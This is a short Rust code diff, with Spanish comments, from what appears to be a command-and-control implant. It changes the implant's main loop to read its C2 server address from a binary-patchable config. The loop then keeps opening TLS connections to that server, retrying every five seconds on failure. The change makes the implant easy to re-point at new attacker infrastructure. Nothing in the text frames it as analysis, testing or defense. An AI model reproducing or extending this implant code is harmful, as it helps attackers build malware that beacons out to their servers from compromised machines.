@@ -120,7 +120,9 @@ fn main() {
         }
     }
 
-    debug_print!("DEBUG: Conectando (TLS) a {}", config::C2_SERVER);
+    // Get server address from patchable config (supports binary patching)
+    let c2_server = config::get_c2_server();
+    debug_print!("DEBUG: Conectando (TLS) a {}", c2_server);
 
     // Crear configuración TLS
     let tls_config = create_tls_config();
@@ -131,16 +133,16 @@ fn main() {
 
     loop {
         // Extraer host y puerto del servidor
-        let (host, _port) = match config::C2_SERVER.rsplit_once(':') {
+        let (host, _port) = match c2_server.rsplit_once(':') {
             Some((h, p)) => (h, p),
             None => {
-                debug_print!("DEBUG: Formato de servidor inválido: {}", config::C2_SERVER);
+                debug_print!("DEBUG: Formato de servidor inválido: {}", c2_server);
                 thread::sleep(Duration::from_secs(5));
                 continue;
             }
         };
 
-        match TcpStream::connect(config::C2_SERVER) {
+        match TcpStream::connect(c2_server) {
             Ok(tcp_stream) => {
                 debug_print!("DEBUG: Conexión TCP establecida");
 
